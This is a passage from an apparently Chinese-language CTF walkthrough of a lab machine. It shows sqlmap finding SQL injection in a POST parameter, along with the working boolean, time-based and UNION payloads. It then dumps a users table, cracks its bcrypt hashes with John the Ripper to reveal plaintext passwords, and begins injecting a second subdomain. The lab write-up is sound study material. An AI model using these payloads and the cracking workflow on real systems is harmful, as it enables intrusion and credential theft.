<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'</span>
<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'</span>
<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'</span>
<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'</span>
<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'</span>
<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'</span>
<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'</span>
<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'</span>
<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'</span>
<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.5 error-based - Parameter replace (EXP)'</span>
<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'</span>
<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'</span>
<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'</span>
<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'</span>
<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'</span>
<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'Generic inline queries'</span>
<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL inline queries'</span>
<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.0.12 stacked queries (comment)'</span>
<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.0.12 stacked queries'</span>
<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'</span>
<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.0.12 stacked queries (query SLEEP)'</span>
<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL &lt; 5.0.12 stacked queries (BENCHMARK - comment)'</span>
<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL &lt; 5.0.12 stacked queries (BENCHMARK)'</span>
<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'</span>
<span class="token punctuation">[</span><span class="token number">12</span>:22:36<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> POST parameter <span class="token string">'sentence-query'</span> appears to be <span class="token string">'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'</span> injectable 
<span class="token punctuation">[</span><span class="token number">12</span>:22:36<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'Generic UNION query (NULL) - 1 to 20 columns'</span>
<span class="token punctuation">[</span><span class="token number">12</span>:22:36<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> automatically extending ranges <span class="token keyword">for</span> UNION query injection technique tests as there is at least one other <span class="token punctuation">(</span>potential<span class="token punctuation">)</span> technique found
<span class="token punctuation">[</span><span class="token number">12</span>:22:36<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> <span class="token string">'ORDER BY'</span> technique appears to be usable. This should reduce the <span class="token function">time</span> needed to <span class="token function">find</span> the right number of query columns. Automatically extending the range <span class="token keyword">for</span> current UNION query injection technique <span class="token builtin class-name">test</span>
<span class="token punctuation">[</span><span class="token number">12</span>:22:36<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> target URL appears to have <span class="token number">5</span> columns <span class="token keyword">in</span> query
<span class="token punctuation">[</span><span class="token number">12</span>:22:36<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> POST parameter <span class="token string">'sentence-query'</span> is <span class="token string">'Generic UNION query (NULL) - 1 to 20 columns'</span> injectable
POST parameter <span class="token string">'sentence-query'</span> is vulnerable. Do you want to keep testing the others <span class="token punctuation">(</span>if any<span class="token punctuation">)</span>? <span class="token punctuation">[</span>y/N<span class="token punctuation">]</span> N
sqlmap identified the following injection point<span class="token punctuation">(</span>s<span class="token punctuation">)</span> with a total of <span class="token number">65</span> HTTP<span class="token punctuation">(</span>s<span class="token punctuation">)</span> requests:
---
Parameter: sentence-query <span class="token punctuation">(</span>POST<span class="token punctuation">)</span>
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: sentence-query<span class="token operator">=</span>Done<span class="token string">' AND 9633=9633 AND '</span>hsIf<span class="token string">'='</span>hsIf

    Type: time-based blind
    Title: MySQL <span class="token operator">>=</span> <span class="token number">5.0</span>.12 AND time-based blind <span class="token punctuation">(</span>query SLEEP<span class="token punctuation">)</span>
    Payload: sentence-query<span class="token operator">=</span>Done<span class="token string">' AND (SELECT 6191 FROM (SELECT(SLEEP(5)))KmLH) AND '</span>DrDD<span class="token string">'='</span>DrDD

    Type: UNION query
    Title: Generic UNION query <span class="token punctuation">(</span>NULL<span class="token punctuation">)</span> - <span class="token number">5</span> columns
    Payload: sentence-query<span class="token operator">=</span>Done<span class="token string">' UNION ALL SELECT NULL,NULL,CONCAT(0x7170707a71,0x7959585547746b5a49556767585875667367677374535a777a636761446d6c6776644a4379734151,0x717a707871),NULL,NULL-- -
---
do you want to exploit this SQL injection? [Y/n] Y
[12:22:36] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.10 or 20.04 or 19.10 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.0.12
[12:22:36] [INFO] fetching database names
available databases [4]:
[*] blog
[*] information_schema
[*] mysql
[*] performance_schema

[12:22:36] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '</span>/root/.local/share/sqlmap/output/results-06232024_1222pm.csv'

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> ending @ <span class="token number">12</span>:22:36 /2024-06-23/</code></pre>
<p>找到user表然后dump</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> sqlmap <span class="token parameter variable">-l</span> a.txt <span class="token parameter variable">--batch</span> <span class="token parameter variable">-D</span> blog <span class="token parameter variable">-T</span> <span class="token function">users</span> <span class="token parameter variable">--dump</span>
        ___
       __H__                                                                                                                                                                                                                                                                                                                
 ___ ___<span class="token punctuation">[</span>,<span class="token punctuation">]</span>_____ ___ ___  <span class="token punctuation">&#123;</span><span class="token number">1.8</span>.2<span class="token comment">#stable&#125;                                                                                                                                                                                                                                                                                    </span>
<span class="token operator">|</span>_ -<span class="token operator">|</span> <span class="token builtin class-name">.</span> <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">]</span>     <span class="token operator">|</span> <span class="token builtin class-name">.</span><span class="token string">'| . |                                                                                                                                                                                                                                                                                                   
|___|_  [(]_|_|_|__,|  _|                                                                                                                                                                                                                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user'</span>s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible <span class="token keyword">for</span> any misuse or damage caused by this program

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> starting @ <span class="token number">12</span>:28:05 /2024-06-23/

<span class="token punctuation">[</span><span class="token number">12</span>:28:05<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> sqlmap parsed <span class="token number">1</span> <span class="token punctuation">(</span>parameter unique<span class="token punctuation">)</span> requests from the targets list ready to be tested
<span class="token punctuation">[</span><span class="token number">1</span>/1<span class="token punctuation">]</span> URL:
GET http://blog.literal.hmv:80/next_projects_to_do.php
Cookie: <span class="token assign-left variable">PHPSESSID</span><span class="token operator">=</span>ccbhsfj6hk03lc0ddern711k9n
POST data: sentence-query<span class="token operator">=</span>Done
<span class="token keyword">do</span> you want to <span class="token builtin class-name">test</span> this URL? <span class="token punctuation">[</span>Y/n/q<span class="token punctuation">]</span>
<span class="token operator">></span> Y
<span class="token punctuation">[</span><span class="token number">12</span>:28:05<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing URL <span class="token string">'http://blog.literal.hmv:80/next_projects_to_do.php'</span>
<span class="token punctuation">[</span><span class="token number">12</span>:28:05<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> resuming back-end DBMS <span class="token string">'mysql'</span> 
<span class="token punctuation">[</span><span class="token number">12</span>:28:05<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> using <span class="token string">'/root/.local/share/sqlmap/output/results-06232024_1228pm.csv'</span> as the CSV results <span class="token function">file</span> <span class="token keyword">in</span> multiple targets mode
<span class="token punctuation">[</span><span class="token number">12</span>:28:05<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing connection to the target URL
sqlmap resumed the following injection point<span class="token punctuation">(</span>s<span class="token punctuation">)</span> from stored session:
---
Parameter: sentence-query <span class="token punctuation">(</span>POST<span class="token punctuation">)</span>
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: sentence-query<span class="token operator">=</span>Done<span class="token string">' AND 9633=9633 AND '</span>hsIf<span class="token string">'='</span>hsIf

    Type: time-based blind
    Title: MySQL <span class="token operator">>=</span> <span class="token number">5.0</span>.12 AND time-based blind <span class="token punctuation">(</span>query SLEEP<span class="token punctuation">)</span>
    Payload: sentence-query<span class="token operator">=</span>Done<span class="token string">' AND (SELECT 6191 FROM (SELECT(SLEEP(5)))KmLH) AND '</span>DrDD<span class="token string">'='</span>DrDD

    Type: UNION query
    Title: Generic UNION query <span class="token punctuation">(</span>NULL<span class="token punctuation">)</span> - <span class="token number">5</span> columns
    Payload: sentence-query<span class="token operator">=</span>Done<span class="token string">' UNION ALL SELECT NULL,NULL,CONCAT(0x7170707a71,0x7959585547746b5a49556767585875667367677374535a777a636761446d6c6776644a4379734151,0x717a707871),NULL,NULL-- -
---
do you want to exploit this SQL injection? [Y/n] Y
[12:28:05] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.04 or 20.10 or 19.10 (focal or eoan)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.0.12
[12:28:05] [INFO] fetching columns for table '</span><span class="token function">users</span><span class="token string">' in database '</span>blog<span class="token string">'
[12:28:05] [INFO] fetching entries for table '</span><span class="token function">users</span><span class="token string">' in database '</span>blog<span class="token string">'
Database: blog
Table: users
[18 entries]
+--------+-----------+----------------------------------+--------------------------------------------------------------+---------------------+
| userid | username  | useremail                        | userpassword                                                 | usercreatedate      |
+--------+-----------+----------------------------------+--------------------------------------------------------------+---------------------+
| 1      | test      | test@blog.literal.htb            | $2y$10$wWhvCz1pGsKm..jh/lChIOA7aJoZRAil40YKlGFiw6B.6a77WzNma | 2023-04-07 17:21:47 |
| 2      | admin     | admin@blog.literal.htb           | $2y$10$fjNev2yv9Bi1IQWA6VOf9Owled5hExgUZNoj8gSmc7IdZjzuOWQ8K | 2023-04-07 17:21:47 |
| 3      | carlos    | carlos@blog.literal.htb          | $2y$10$ikI1dN/A1lhkKLmiKl.cJOkLiSgPUPiaRoopeqvD/.p.bh0w.bJBW | 2023-04-07 17:21:48 |
| 4      | freddy123 | freddy123@zeeli.moc              | $2y$10$yaf9nZ6UJkf8103R8rMdtOUC.vyZUek4vXVPas3CPOb4EK8I6eAUK | 2023-04-07 17:21:48 |
| 5      | jorg3_M   | jorg3_M@zeeli.moc                | $2y$10$lZ./Zflz1EEFdYbWp7VUK.415Ni8q9kYk3LJ2nF0soRJG1RymtDzG | 2023-04-07 17:21:48 |
| 6      | aNdr3s1to | aNdr3s1to@puertonacional.ply     | $2y$10$F2Eh43xkXR/b0KaGFY5MsOwlnh4fuEZX3WNhT3PxSw.6bi/OBA6hm | 2023-04-07 17:21:48 |
| 7      | kitty     | kitty@estadodelarte.moc          | $2y$10$rXliRlBckobgE8mJTZ7oXOaZr4S2NSwqinbUGLcOfCWDra6v9bxcW | 2023-04-07 17:21:48 |
| 8      | walter    | walter@forumtesting.literal.hmv  | $2y$10$er9GaSRv1AwIwu9O.tlnnePNXnzDfP7LQMAUjW2Ca1td3p0Eve6TO | 2023-04-07 17:21:48 |
| 9      | estefy    | estefy@caselogic.moc             | $2y$10$hBB7HeTJYBAtdFn7Q4xzL.WT3EBMMZcuTJEAvUZrRe.9szCp19ZSa | 2023-04-07 17:21:48 |
| 10     | michael   | michael@without.you              | $2y$10$sCbKEWGgAUY6a2Y.DJp8qOIa250r4ia55RMrDqHoRYU3Y7pL2l8Km | 2023-04-07 17:21:48 |
| 11     | r1ch4rd   | r1ch4rd@forumtesting.literal.hmv | $2y$10$7itXOzOkjrAKk7Mp.5VN5.acKwGi1ziiGv8gzQEK7FOFLomxV0pkO | 2023-04-07 17:21:48 |
| 12     | fel1x     | fel1x@without.you                | $2y$10$o06afYsuN8yk0yoA.SwMzucLEavlbI8Rl43.S0tbxL.VVSbsCEI0m | 2023-04-07 17:21:48 |
| 13     | kelsey    | kelsey@without.you               | $2y$10$vxN98QmK39rwvVbfubgCWO9W2alVPH4Dp4Bk7DDMWRvfN995V4V6. | 2023-04-07 17:21:48 |
| 14     | jtx       | jtx@tiempoaltiempo.hy            | $2y$10$jN5dt8syJ5cVrlpotOXibeNC/jvW0bn3z6FetbVU/CeFtKwhdhslC | 2023-04-07 17:21:48 |
| 15     | DRphil    | DRphil@alcaldia-tol.gob          | $2y$10$rW58MSsVEaRqr8uIbUeEeuDrYB6nmg7fqGz90rHYHYMt2Qyflm1OC | 2023-04-07 17:21:48 |
| 16     | carm3N    | carm3N@estadodelarte.moc         | $2y$10$D7uF6dKbRfv8U/M/mUj0KujeFxtbj6mHCWT5SaMcug45u7lo/.RnW | 2023-04-07 17:21:48 |
| 17     | lanz      | lanz@literal.htb                 | $2y$10$PLGN5.jq70u3j5fKpR8R6.Zb70So/8IWLi4e69QqJrM8FZvAMf..e | 2023-04-07 17:55:36 |
| 18     | tao       | tao@123.com                      | $2y$10$agmCAS.9yZzo.RH/ureBP..gS5mZbICKTx6D69IGo.PDaacjFtM1y | 2024-06-23 03:54:31 |
+--------+-----------+----------------------------------+--------------------------------------------------------------+---------------------+

[12:28:05] [INFO] table '</span>blog.users<span class="token string">' dumped to CSV file '</span>/root/.local/share/sqlmap/output/blog.literal.hmv/dump/blog/users.csv<span class="token string">'
[12:28:05] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '</span>/root/.local/share/sqlmap/output/results-06232024_1228pm.csv'

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> ending @ <span class="token number">12</span>:28:05 /2024-06-23/
</code></pre>
<p>整理一下</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">test:<span class="token variable">$2y</span><span class="token variable">$10</span><span class="token variable">$wWhvCz1pGsKm</span><span class="token punctuation">..</span>jh/lChIOA7aJoZRAil40YKlGFiw6B.6a77WzNma
admin:<span class="token variable">$2y</span><span class="token variable">$10</span><span class="token variable">$fjNev2yv9Bi1IQWA6VOf9Owled5hExgUZNoj8gSmc7IdZjzuOWQ8K</span>
carlos:<span class="token variable">$2y</span><span class="token variable">$10</span><span class="token variable">$ikI1dN</span>/A1lhkKLmiKl.cJOkLiSgPUPiaRoopeqvD/.p.bh0w.bJBW
freddy123:<span class="token variable">$2y</span><span class="token variable">$10</span><span class="token variable">$yaf9nZ6UJkf8103R8rMdtOUC</span>.vyZUek4vXVPas3CPOb4EK8I6eAUK
jorg3_M:<span class="token variable">$2y</span><span class="token variable">$10</span><span class="token variable">$lZ</span>./Zflz1EEFdYbWp7VUK.415Ni8q9kYk3LJ2nF0soRJG1RymtDzG
aNdr3s1to:<span class="token variable">$2y</span><span class="token variable">$10</span><span class="token variable">$F2Eh43xkXR</span>/b0KaGFY5MsOwlnh4fuEZX3WNhT3PxSw.6bi/OBA6hm
kitty:<span class="token variable">$2y</span><span class="token variable">$10</span><span class="token variable">$rXliRlBckobgE8mJTZ7oXOaZr4S2NSwqinbUGLcOfCWDra6v9bxcW</span>
walter:<span class="token variable">$2y</span><span class="token variable">$10</span><span class="token variable">$er9GaSRv1AwIwu9O</span>.tlnnePNXnzDfP7LQMAUjW2Ca1td3p0Eve6TO
estefy:<span class="token variable">$2y</span><span class="token variable">$10</span><span class="token variable">$hBB7HeTJYBAtdFn7Q4xzL</span>.WT3EBMMZcuTJEAvUZrRe.9szCp19ZSa
michael:<span class="token variable">$2y</span><span class="token variable">$10</span><span class="token variable">$sCbKEWGgAUY6a2Y</span>.DJp8qOIa250r4ia55RMrDqHoRYU3Y7pL2l8Km
r1ch4rd:<span class="token variable">$2y</span><span class="token variable">$10</span><span class="token variable">$7itXOzOkjrAKk7Mp</span>.5VN5.acKwGi1ziiGv8gzQEK7FOFLomxV0pkO
fel1x:<span class="token variable">$2y</span><span class="token variable">$10</span><span class="token variable">$o06afYsuN8yk0yoA</span>.SwMzucLEavlbI8Rl43.S0tbxL.VVSbsCEI0m
kelsey:<span class="token variable">$2y</span><span class="token variable">$10</span><span class="token variable">$vxN98QmK39rwvVbfubgCWO9W2alVPH4Dp4Bk7DDMWRvfN995V4V6</span><span class="token builtin class-name">.</span>
jtx:<span class="token variable">$2y</span><span class="token variable">$10</span><span class="token variable">$jN5dt8syJ5cVrlpotOXibeNC</span>/jvW0bn3z6FetbVU/CeFtKwhdhslC
DRphil:<span class="token variable">$2y</span><span class="token variable">$10</span><span class="token variable">$rW58MSsVEaRqr8uIbUeEeuDrYB6nmg7fqGz90rHYHYMt2Qyflm1OC</span>
carm3N:<span class="token variable">$2y</span><span class="token variable">$10</span><span class="token variable">$D7uF6dKbRfv8U</span>/M/mUj0KujeFxtbj6mHCWT5SaMcug45u7lo/.RnW
lanz:<span class="token variable">$2y</span><span class="token variable">$10</span><span class="token variable">$PLGN5</span>.jq70u3j5fKpR8R6.Zb70So/8IWLi4e69QqJrM8FZvAMf<span class="token punctuation">..</span>e
tao:<span class="token variable">$2y</span><span class="token variable">$10</span><span class="token variable">$agmCAS</span>.9yZzo.RH/ureBP<span class="token punctuation">..</span>gS5mZbICKTx6D69IGo.PDaacjFtM1y</code></pre>
<p>不是我爆了半天一个ssh也登不上去，说明这条路有点问题</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> john b.txt                                          
Using default input encoding: UTF-8
Loaded <span class="token number">18</span> password hashes with <span class="token number">18</span> different salts <span class="token punctuation">(</span>bcrypt <span class="token punctuation">[</span>Blowfish <span class="token number">32</span>/64 X3<span class="token punctuation">]</span><span class="token punctuation">)</span>
Cost <span class="token number">1</span> <span class="token punctuation">(</span>iteration count<span class="token punctuation">)</span> is <span class="token number">1024</span> <span class="token keyword">for</span> all loaded hashes
Proceeding with single, rules:Single
Press <span class="token string">'q'</span> or Ctrl-C to abort, almost any other key <span class="token keyword">for</span> status
Warning: Only <span class="token number">3</span> candidates buffered <span class="token keyword">for</span> the current salt, minimum <span class="token number">8</span> needed <span class="token keyword">for</span> performance.
Warning: Only <span class="token number">2</span> candidates buffered <span class="token keyword">for</span> the current salt, minimum <span class="token number">8</span> needed <span class="token keyword">for</span> performance.
Warning: Only <span class="token number">3</span> candidates buffered <span class="token keyword">for</span> the current salt, minimum <span class="token number">8</span> needed <span class="token keyword">for</span> performance.
Warning: Only <span class="token number">2</span> candidates buffered <span class="token keyword">for</span> the current salt, minimum <span class="token number">8</span> needed <span class="token keyword">for</span> performance.
Warning: Only <span class="token number">3</span> candidates buffered <span class="token keyword">for</span> the current salt, minimum <span class="token number">8</span> needed <span class="token keyword">for</span> performance.
Warning: Only <span class="token number">2</span> candidates buffered <span class="token keyword">for</span> the current salt, minimum <span class="token number">8</span> needed <span class="token keyword">for</span> performance.
Warning: Only <span class="token number">3</span> candidates buffered <span class="token keyword">for</span> the current salt, minimum <span class="token number">8</span> needed <span class="token keyword">for</span> performance.
Warning: Only <span class="token number">2</span> candidates buffered <span class="token keyword">for</span> the current salt, minimum <span class="token number">8</span> needed <span class="token keyword">for</span> performance.
Warning: Only <span class="token number">3</span> candidates buffered <span class="token keyword">for</span> the current salt, minimum <span class="token number">8</span> needed <span class="token keyword">for</span> performance.
Warning: Only <span class="token number">2</span> candidates buffered <span class="token keyword">for</span> the current salt, minimum <span class="token number">8</span> needed <span class="token keyword">for</span> performance.
Further messages of this <span class="token builtin class-name">type</span> will be suppressed.
tao              <span class="token punctuation">(</span>tao<span class="token punctuation">)</span>     
<span class="token builtin class-name">test</span>             <span class="token punctuation">(</span>test<span class="token punctuation">)</span>     
kelsey           <span class="token punctuation">(</span>kelsey<span class="token punctuation">)</span>     
michael1         <span class="token punctuation">(</span>michael<span class="token punctuation">)</span>     
carlos12         <span class="token punctuation">(</span>carlos<span class="token punctuation">)</span>     
Almost done: Processing the remaining buffered candidate passwords, <span class="token keyword">if</span> any.
Proceeding with wordlist:/usr/share/john/password.lst
<span class="token number">123456789</span>        <span class="token punctuation">(</span>freddy123<span class="token punctuation">)</span>     
monica           <span class="token punctuation">(</span>r1ch4rd<span class="token punctuation">)</span>     
butterfly        <span class="token punctuation">(</span>estefy<span class="token punctuation">)</span>     
hellokitty       <span class="token punctuation">(</span>kitty<span class="token punctuation">)</span>     
50cent           <span class="token punctuation">(</span>DRphil<span class="token punctuation">)</span>     
slipknot         <span class="token punctuation">(</span>jorg3_M<span class="token punctuation">)</span>     
<span class="token number">147258369</span>        <span class="token punctuation">(</span>fel1x<span class="token punctuation">)</span>     
<span class="token number">741852963</span>        <span class="token punctuation">(</span>walter<span class="token punctuation">)</span></code></pre>
<p>往上翻了一下记录，注意到数据库里面的邮箱有个子域<code>forumtesting.literal.hmv </code>,添加到hosts<br><img src="https://ooo.0x0.ooo/2024/06/23/OPz0z6.png" alt="OPz0z6.png" loading="lazy"><br>尝试用walter账号密码登录失败<br>注意到url又有参数了，再尝试sql注入<br><img src="https://ooo.0x0.ooo/2024/06/23/OPzcPP.png" alt="OPzcPP.png" loading="lazy"></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> sqlmap <span class="token parameter variable">--url</span> http://forumtesting.literal.hmv/category.php<span class="token punctuation">\</span>?category_id<span class="token punctuation">\</span><span class="token operator">=</span><span class="token number">2</span> <span class="token parameter variable">--batch</span>
        ___
       __H__                                                                                                                                                                                                                                
 ___ ___<span class="token punctuation">[</span><span class="token string">']_____ ___ ___  &#123;1.8.2#stable&#125;                                                                                                                                                                                                    
|_ -| . ["]     | .'</span><span class="token operator">|</span> <span class="token builtin class-name">.</span> <span class="token operator">|</span>                                                                                                                                                                                                                   
<span class="token operator">|</span>___<span class="token operator">|</span>_  <span class="token punctuation">[</span><span class="token string">']_|_|_|__,|  _|                                                                                                                                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user'</span>s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible <span class="token keyword">for</span> any misuse or damage caused by this program

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> starting @ <span class="token number">12</span>:50:12 /2024-06-23/

<span class="token punctuation">[</span><span class="token number">12</span>:50:12<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing connection to the target URL
you have not declared cookie<span class="token punctuation">(</span>s<span class="token punctuation">)</span>, <span class="token keyword">while</span> server wants to <span class="token builtin class-name">set</span> its own <span class="token punctuation">(</span><span class="token string">'PHPSESSID=2ae111171bd...i3lb256a8a'</span><span class="token punctuation">)</span>. Do you want to use those <span class="token punctuation">[</span>Y/n<span class="token punctuation">]</span> Y
<span class="token punctuation">[</span><span class="token number">12</span>:50:12<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> checking <span class="token keyword">if</span> the target is protected by some kind of WAF/IPS
<span class="token punctuation">[</span><span class="token number">12</span>:50:12<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token keyword">if</span> the target URL content is stable
<span class="token punctuation">[</span><span class="token number">12</span>:50:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> target URL content is stable
<span class="token punctuation">[</span><span class="token number">12</span>:50:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token keyword">if</span> GET parameter <span class="token string">'category_id'</span> is dynamic
<span class="token punctuation">[</span><span class="token number">12</span>:50:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> GET parameter <span class="token string">'category_id'</span> appears to be dynamic
<span class="token punctuation">[</span><span class="token number">12</span>:50:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> heuristic <span class="token punctuation">(</span>basic<span class="token punctuation">)</span> <span class="token builtin class-name">test</span> shows that GET parameter <span class="token string">'category_id'</span> might not be injectable
<span class="token punctuation">[</span><span class="token number">12</span>:50:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token keyword">for</span> SQL injection on GET parameter <span class="token string">'category_id'</span>
<span class="token punctuation">[</span><span class="token number">12</span>:50:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'AND boolean-based blind - WHERE or HAVING clause'</span>
<span class="token punctuation">[</span><span class="token number">12</span>:50:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> reflective value<span class="token punctuation">(</span>s<span class="token punctuation">)</span> found and filtering out
<span class="token punctuation">[</span><span class="token number">12</span>:50:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'Boolean-based blind - Parameter replace (original value)'</span>
<span class="token punctuation">[</span><span class="token number">12</span>:50:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'</span>
